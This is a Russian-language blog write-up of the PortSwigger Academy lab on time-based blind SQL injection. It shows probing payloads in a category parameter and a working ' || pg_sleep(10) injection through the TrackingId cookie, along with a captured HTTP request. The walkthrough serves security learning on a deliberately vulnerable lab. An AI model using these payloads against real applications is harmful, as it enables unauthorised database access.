---
title: "Blind SQL injection with time delays"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/sql-injection/blind/lab-time-delays"
classes: wide
---

Лаба уязвима к **SQL injection**. Для решения лабы нужно получить ответ от сервера с задержкой в 10 секунд.

```
https://0a9000d20405945d8194754100d30039.web-security-academy.net/
```

## Solution

По описанию понятно, что нужно сделать **TIME BASED SQL injection**. Для этого удобнее использовать `Burp`, чтобы видеть время ответа. Сразу обращу внимание на передачу категории через параметр `GET`-запроса:

```
https://0a9000d20405945d8194754100d30039.web-security-academy.net/filter?category=Accessories
```

Попробую подобрать пейлоад:

```
Accessories' and 1=0-- -ok
```

Я получил пустой вывод, хотя категория верная. Значит для обрамления используется `'`.


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_time_delays/1.png){: height="200" .align-center}


Попробовал на шару закинуть пейлоад с `UNION`:

```
Accessories' UNION SELECT "a", "b" FROM dual-- -error
```

Не вышло. Ладно:( Мне нужно выполнить команду `sleep` на 10 секунд, так что не важно:

```
Accessories' and sleep(10)-- -err
Accessories' and pg_sleep(10)-- -err
```

Хммм... что-то странное. Нужно поискать в другом месте: 

```HTTP
GET /filter?category=Accessories HTTP/2
Host: 0a9000d20405945d8194754100d30039.web-security-academy.net
Cookie: TrackingId=00bWl7TEuuOPDqur; session=M3ntiGbaODBwSWjxY1TJ1qPRaNARTYB0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9000d20405945d8194754100d30039.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Значение `Cookie` похоже на кастомное. Попробую передать запрос через этот параметр:

```
TrackingId=' || sleep(10)-- -none
TrackingId=' || pg_sleep(10)-- -ok
```

Сработало. Так как обрамления я нашел в `GET`-запросе фильтра, то предположил, что такое же используется в этой обработке. А перебрать разные слипы не сложно.


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_time_delays/2.png){: height="200" .align-center}


Лаба решена) ☕


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_time_delays/3.png){: height="200" .align-center}

